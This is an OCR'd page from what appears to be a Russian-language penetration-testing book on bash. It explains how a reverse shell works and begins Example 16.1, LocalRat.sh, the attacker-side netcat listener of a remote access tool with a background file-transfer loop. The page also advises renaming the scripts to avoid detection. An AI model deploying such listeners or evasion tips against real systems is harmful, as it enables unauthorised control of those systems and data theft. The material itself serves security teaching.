---
source_image: page_238.png
page_number: 238
model: model-run-olm-ocr
prompt_type: olmocr_technical
processing_time: 8.84
tokens: 7394
characters: 1500
timestamp: 2025-12-23T23:10:48.225964
finish_reason: stop
---

начиная с приглашения ввода, появится на экране атакующей системы. Любой текст, набранный на клавиатуре в атакующей системе, через TCP-соединение передается программе, запущенной во взломанной системе, то есть bash. Поэтому злоумышленник может вводить любые допустимые команды bash, и они будут выполняться в скомпрометированной системе, а полученные результаты (и сообщения об ошибках) будут передаваться атакующей системе. Это удаленная оболочка, которая вызывается в обратном порядке.

Давайте более подробно рассмотрим операторы, используемые для создания такой пары сценариев. В примере 16.1 не только создается прослушиватель, но и ожидается обратный вызов целевой системы.

Чтобы избежать обнаружения во время реального теста на проникновение, вы, скорее всего, захотите присвоить этим сценариям более универсальные имена.

Пример 16.1. LocalRat.sh

#!/bin/bash -
#
# Bash и кибербезопасность
# LocalRat.sh
#
# Описание:
# Инструмент удаленного доступа для локальной системы,
# прослушивает соединение с удаленной системой
# и помогает с любой запрошенной передачей файла
#
# Использование: LocalRat.sh port1 [port2 [port3]]
#

# определяем наш демон фоновой передачи файлов
function bgfilexfer ()
{
    while true
    do
        FN=$(nc -nlvvp $HOMEPORT2 2>>/tmp/x2.err)
        if [[ $FN == 'exit' ]]; then exit ; fi
        nc -nlp $HOMEPORT3 < $FN
    done
}

# ---------------------- main ----------------------
HOMEPORT=$1
HOMEPORT2=${2:-$((HOMEPORT+1))}
HOMEPORT3=${3:-$((HOMEPORT2+1))}